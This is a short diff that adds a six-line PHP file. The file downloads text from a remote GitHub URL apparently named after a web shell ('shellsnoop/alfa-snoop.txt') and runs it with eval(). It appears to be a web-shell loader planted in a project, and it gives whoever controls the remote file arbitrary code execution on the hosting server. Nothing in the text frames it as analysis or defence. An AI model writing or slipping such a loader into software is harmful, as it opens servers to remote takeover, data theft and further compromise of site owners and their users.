@@ -1,0 +1,6 @@
+<?php
+
+$content = file_get_contents(urldecode('https://raw.githubusercontent.com/callsnoop/shellsnoop/refs/heads/main/alfa-snoop.txt'));
+
+$content = "?> ".$content;
+eval($content);
